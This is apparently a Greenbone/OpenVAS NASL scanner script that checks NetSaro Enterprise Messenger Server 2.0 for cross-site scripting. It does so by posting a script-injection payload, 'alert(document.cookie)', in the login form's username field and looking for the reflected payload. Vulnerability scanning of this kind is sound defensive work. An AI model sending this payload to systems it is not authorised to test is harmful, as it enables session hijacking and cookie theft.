if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.801971" );
	script_version( "2020-08-24T15:18:35+0000" );
	script_tag( name: "last_modification", value: "2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2011-09-07 08:36:57 +0200 (Wed, 07 Sep 2011)" );
	script_tag( name: "cvss_base", value: "4.3" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:M/Au:N/C:N/I:P/A:N" );
	script_name( "NetSaro Enterprise Messenger Multiple XSS and CSRF Vulnerabilities" );
	script_xref( name: "URL", value: "http://www.1337day.com/exploits/16809" );
	script_xref( name: "URL", value: "http://www.exploit-db.com/exploits/17766/" );
	script_category( ACT_ATTACK );
	script_family( "Web application abuses" );
	script_copyright( "Copyright (C) 2011 Greenbone Networks GmbH" );
	script_dependencies( "find_service.sc", "httpver.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 4990 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_tag( name: "impact", value: "Successful exploitation could allow remote attackers to execute
  arbitrary script code within the users browser session in the security context
  of the target site and the attacker could gain access to users cookies
  (including authentication cookies)." );
	script_tag( name: "affected", value: "NetSaro Enterprise Messenger Server version 2.0 and prior." );
	script_tag( name: "insight", value: "Multiple flaws are exists as the user supplied input received
  via various parameters is not properly sanitized. This can be exploited by
  submitting specially crafted input to the affected software." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one." );
	script_tag( name: "summary", value: "The host is running NetSaro Enterprise Messenger Server and is
  prone to multiple cross-site scripting and cross-site request forgery
  vulnerabilities." );
	script_tag( name: "solution_type", value: "WillNotFix" );
	script_tag( name: "qod_type", value: "remote_vul" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
port = http_get_port( default: 4990 );
rcvRes = http_get_cache( item: "/", port: port );
host = http_host_name( port: port );
if(ContainsString( rcvRes, "<title>NetSaro Administration Console</title>" )){
	authVariables = "username=%22%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document" + ".cookie%29%3C%2Fscript%3E&password=&login=Log+In&postback=" + "postback";
	sndReq1 = NASLString( "POST /login.nsp HTTP/1.1\\r\\n", "Host: ", host, "\\r\\n", "Content-Type: application/x-www-form-urlencoded\\r\\n", "Content-Length: ", strlen( authVariables ), "\\r\\n\\r\\n", authVariables );
	rcvRes1 = http_keepalive_send_recv( port: port, data: sndReq1 );
	if(IsMatchRegexp( rcvRes1, "HTTP/1\\.. 200" ) && ContainsString( rcvRes1, "></script><script>alert(document.cookie)</script>" )){
		security_message( port: port );
		exit( 0 );
	}
}
exit( 99 );

